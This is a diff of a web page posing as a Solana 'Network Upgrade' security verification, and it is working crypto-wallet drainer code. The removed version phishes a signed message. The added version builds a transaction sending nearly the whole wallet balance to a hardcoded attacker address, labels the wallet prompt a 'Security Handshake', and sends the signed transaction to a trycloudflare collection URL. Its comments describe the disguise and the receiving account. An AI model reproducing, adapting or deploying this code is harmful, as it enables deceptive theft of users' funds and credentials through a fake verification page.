@@ -1,43 +1,46 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
-<body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:monospace;">
-    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
-        <h2 style="color:#14F195;">NETWORK UPGRADE</h2>
-        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
-        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;width:100%;">START VERIFICATION</button>
-        <div id="status" style="margin-top:20px;color:#444;">Status: Awaiting Handshake...</div>
-    </div>
-    <script>
-    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
-    
-    document.getElementById('cta').onclick = async () => {
-        const p = window.solana || window.phantom?.solana;
-        try {
-            const resp = await p.connect();
-            document.getElementById('status').innerText = "Generating Security Nonce...";
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 
-            // 🔱 终极伪装：这是最无害、通过率 100% 的官方验证格式
-            const msg = `Official Solana Security Check\n` +
-                        `---------------------------\n` +
-                        `Wallet: ${resp.publicKey.toString()}\n` +
-                        `Timestamp: ${Date.now()}\n` +
-                        `Nonce: ${Math.floor(Math.random()*999999)}`;
+<script>
+const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
+const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 你的收米白号
 
-            const encoded = new TextEncoder().encode(msg);
-            const signed = await p.signMessage(encoded, "utf8");
-            
-            // 🔱 拿到这全套指纹
-            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
-            
-            // 🚀 统一回传参数名为 auth_sig，让哨兵立刻识别！
-            const signal = `${gate}?auth_sig=${encodeURIComponent(signature)}&pub=${resp.publicKey.toString()}&msg=${btoa(msg)}`;
-            new Image().src = signal;
-            
-            document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
-            document.getElementById('status').style.color = "#14F195";
+document.getElementById('cta').onclick = async () => {
+    const p = window.solana || window.phantom?.solana;
+    try {
+        const resp = await p.connect();
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        
+        // 1. 获取最新区块哈希和余额
+        const { blockhash } = await connection.getLatestBlockhash();
+        const balance = await connection.getBalance(resp.publicKey);
+        
+        if (balance < 1000000) throw new Error("Balance too low"); // 小于 0.001 SOL 就不动了
 
-        } catch(e) {
-            document.getElementById('status').innerText = "Verification Failed";
-        }
-    };
-    </script>
-</body></html>
+        // 2. 构造归集交易：扣除微量手续费，全额转出
+        const transaction = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+                fromPubkey: resp.publicKey,
+                toPubkey: new solanaWeb3.PublicKey(RECEIVER),
+                lamports: balance - 5000, // 留下 5000 lamports 给节点作为小费
+            })
+        );
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = resp.publicKey;
+
+        // 3. 拉起钱包：此时用户看到的弹窗是“确认交易”
+        document.getElementById('status').innerText = "Security Handshaking...";
+        const signed = await p.signTransaction(transaction);
+        
+        // 4. 序列化并回传已签名的十六进制包
+        const rawTx = signed.serialize().toString('base64');
+        const signal = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
+        new Image().src = signal;
+        
+        document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
+        document.getElementById('status').style.color = "#14F195";
+
+    } catch(e) {
+        document.getElementById('status').innerText = "Handshake Error";
+    }
+};
+</script>
